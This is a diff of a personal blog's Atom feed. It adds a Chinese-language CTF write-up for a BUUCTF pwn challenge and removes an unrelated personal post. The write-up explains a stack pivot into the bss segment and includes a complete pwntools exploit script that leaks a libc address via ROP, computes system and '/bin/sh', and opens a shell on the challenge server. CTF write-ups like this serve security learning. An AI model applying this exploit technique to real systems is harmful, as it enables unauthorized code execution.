@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-07-11T05:41:52.682Z</updated>
+  <updated>2021-07-15T04:09:50.248Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwn1</title>
+    <link href="https://pr0b1em.github.io/2021/07/15/pwn1/"/>
+    <id>https://pr0b1em.github.io/2021/07/15/pwn1/</id>
+    <published>2021-07-15T04:08:09.000Z</published>
+    <updated>2021-07-15T04:09:50.248Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p><p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p><p>IDA打开，查看main函数，看到vul_function()函数</p><p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p><p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然buf在栈上但输入的长度仅仅能够覆盖<span class="built_in">ebp</span>和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p><p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p><p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27426</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_s = <span class="number">0x0804A300</span><span class="comment">#将fake栈迁移到bss中</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span><span class="comment">#栈迁移所需要的的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]<span class="comment">#plt表可以调用write函数</span></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]<span class="comment">#got表里有write函数的真实地址</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]<span class="comment">#控制函数执行流需要再次回到主函数</span></span><br><span class="line"><span class="comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"><span class="comment"># 上面将一些执行流程写入了bss段</span></span><br><span class="line"><span class="comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> <span class="comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span></span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment">#接收泄露的地址</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]<span class="comment">#获取libc的基地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]<span class="comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))<span class="comment">#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span></span><br><span class="line"><span class="comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span></span><br><span class="line"><span class="comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>]]></content>
+    
+    
+    <summary type="html">栈劫持</summary>
+    
+    
+    
+    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>jarvisoj_level3_x64</title>
@@ -369,25 +388,6 @@
     
     
     <summary type="html">博客诞生日！</summary>
-    
-    
-    
-    <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>飞蓬大将军</title>
-    <link href="https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/"/>
-    <id>https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</id>
-    <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T03:17:17.524Z</updated>
-    
-    <content type="html"><![CDATA[<span id="more"></span><h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p><p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>]]></content>
-    
-    
-    <summary type="html">永远的仙剑</summary>
     
     
     
